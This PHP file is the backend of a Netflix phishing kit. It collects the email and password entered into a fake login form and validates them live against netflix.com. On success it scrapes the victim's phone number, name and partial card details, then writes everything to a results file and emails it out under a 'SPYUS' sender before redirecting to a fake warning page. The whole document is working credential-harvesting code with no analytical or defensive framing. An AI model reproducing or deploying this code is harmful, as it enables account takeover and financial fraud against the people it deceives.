<?php

//error_reporting(0);
set_time_limit(0);
session_start();
include('__CONFIG__.php');
include'./app/functions.php';
$Cookie['cookie_file'] = __DIR__.'/logs/' . sha1(time()) . '.log';
function icurl($url = '', $var = '', $header = false, $nobody = false , $csrf = '')
{
    global $Cookie;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36');
    if($csrf) {
        curl_setopt($curl,CURLOPT_HTTPHEADER, array('X-Requested-With: XMLHttpRequest','x-csrf-jwt: '.$csrf,'Accept: application/json, text/plain, */*','Content-Type: application/json;charset=utf-8'));
    }
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $Cookie['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $Cookie['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.netflix.com/login');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

function LoginError(){
    header('Location: signin.php?Error='.md5(time()));
}

function delete_cookies()
{
    global $Registro;
    @fclose($Remplazar);
}
if (isset($_POST['xoooo']) && isset($_POST['XoooX']))
{
    delete_cookies();

    $_SESSION['EM'] = $_POST['xoooo'];
    $_SESSION['PW'] = $_POST['XoooX'];

    $get_token = icurl('https://www.netflix.com/login');

    $preg_token = preg_match_all("/name=\"authURL\" value=\"(.*?)\"/", $get_token, $arr_token);


    $test_true = icurl(
    'https://www.netflix.com/ma-fr/login',
    'email='.rawurlencode($_POST['xoooo']).'&password='.rawurlencode($_POST['XoooX']).'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL='.rawurlencode($arr_token[1][0]).'&nextPage=&showPassword=: undefined', false, false
    );

    if (preg_match("/hybrid-password-wrapper/i", $test_true))
    {
			$subject  = "NETFLIX NOT TRUE [ LOGIN - BILLING ] - ".$_SERVER['REMOTE_ADDR']."";
            $headers  = "From: SPYUS <rezlt@SPYUS.ORG>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
            $message = "
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset='UTF-8' />
            </head>
            <body>
            <style type='text/css'>
            body{
                background: #141414;
                color: #fff;
                font-family: arial;
            }
            .rezlt{
                width: 600px;
            }
            table{
                width: 100%;
                background: #fff;
                color: #000;
            }
            table td{
                padding: 10px;
            }
            .newline{
                width: 100%;
                background: #141414;
                height: 2px;
            }
            </style>
            <center>
            <div class='rezlt'>
                <h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>Login Email</b></td>
                        <td style='width: 400px;'>".$_SESSION['EM']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Login Password</b></td>
                        <td style='width: 400px;'>".$_SESSION['PW']."</td>
                    </tr>
                </table>
                <div class='newline'></div>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>IP</b></td>
                        <td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>User Agent</b></td>
                        <td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Accept Language</b></td>
                        <td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
                    </tr>
                </table>
            </div>
            </center>
            </body>
            </html>
            ";
            $Txt_Rezlt = fopen('../rezlt.html', 'a+');
            fwrite($Txt_Rezlt, $message);
            fclose($Txt_Rezlt);
            mail($to, $subject, $message, $headers);
            header('location: Warning.php?ErrorLogingnupg_verify='.md5(time()));
    }
    else
    {
        $get_page = icurl('https://www.netflix.com/youraccount');
        //------------------ Login Success
        $_SESSION['accpage'] = $get_page = icurl('https://www.netflix.com/youraccount');
        $PaymentPage = icurl('https://www.netflix.com/simplemember/editcredit');

        //-------- Phone
        $Phone = preg_match_all("/\"phoneNumber\":\"(.*?)\",\"/i", $get_page, $PhoneNumber);
        $_SESSION['phone'] = str_replace('\x2B', '+', $PhoneNumber[1][1]);

        //------ Users
        $Users = preg_match_all("/data-reactid=\"170\"><strong data-reactid=\"171\">(.*?)<\/strong>/i", $get_page, $TotalUsers);
        //$_SESSION['users'] = $TotalUsers[1][0];
        //var_dump($TotalUsers);
        //--------- Credit Card

            //---- Last 4
            $Last4 = preg_match_all("/{\"lastFour\":\"(.*?)\"/i", $get_page, $CCLast4);
            $_SESSION['last4'] = $CCLast4[1][0];

            //---- Experation Date
            $exp_date = preg_match_all("/id=\"id_creditExpirationMonth\" value=\"(.*?)\"/i", $PaymentPage, $CCexpDt);
            $_SESSION['exp_date'] = $CCexpDt[1][0];

            //---- First Name
            $firstname = preg_match_all("/id=\"id_firstName\" value=\"(.*?)\"/i", $PaymentPage, $CCFname);
            if ($CCFname[1][0] == '0')
            {
                $_SESSION['firstname'] = '';
            }
            else
            {
                $_SESSION['firstname'] = $CCFname[1][0];
            }

            //---- Last Name
            $lastname = preg_match_all("/id=\"id_lastName\" value=\"(.*?)\"/i", $PaymentPage, $CCLname);
            if ($CCLname[1][0] == '0')
            {
                $_SESSION['lastname'] = '';
            }
            else
            {
                $_SESSION['lastname'] = $CCLname[1][0];
            }
            //---- Payment Type
            $pmtype = fetch_value($get_page, '"icon-payment icon-payment-', '"');
            $_SESSION['ptype'] = $pmtype;

            $subject  = "NETFLIX TRUE [ LOGIN - BILLING ] - ".$_SERVER['REMOTE_ADDR']."";
            $headers  = "From: SPYUS <rezlt@SPYUS.ORG>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

            $message = "
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset='UTF-8' />
            </head>
            <body>
            <style type='text/css'>
            body{
                background: #141414;
                color: #fff;
                font-family: arial;
            }
            .rezlt{
                width: 600px;
            }
            table{
                width: 100%;
                background: #fff;
                color: #000;
            }
            table td{
                padding: 10px;
            }
            .newline{
                width: 100%;
                background: #141414;
                height: 2px;
            }
            </style>
            <center>
            <div class='rezlt'>
                <h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>Login Email</b></td>
                        <td style='width: 400px;'>".$_SESSION['EM']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Login Password</b></td>
                        <td style='width: 400px;'>".$_SESSION['PW']."</td>
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>First Name</b></td>
                        <td style='width: 400px;'>".$_SESSION['firstname']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Last Name</b></td>
                        <td style='width: 400px;'>".$_SESSION['lastname']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Phone</b></td>
                        <td style='width: 400px;'>".$_SESSION['phone']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Credit Cards</b></td>
                        <td style='width: 400px;'>".$_SESSION['ptype']." ******** ".$_SESSION['last4']." ".$_SESSION['exp_date']."</td>
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>IP</b></td>
                        <td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>User Agent</b></td>
                        <td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Accept Language</b></td>
                        <td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
                    </tr>
                </table>
            </div>
            </center>
            </body>
            </html>
            ";
            $Txt_Rezlt = fopen('../rezlt.html', 'a+');
            fwrite($Txt_Rezlt, $message);
            fclose($Txt_Rezlt);
            mail($to, $subject, $message, $headers);


            header('location: Warning.php?gnupg_verify='.md5(time()));
    }
}
else
{
			LoginError();
}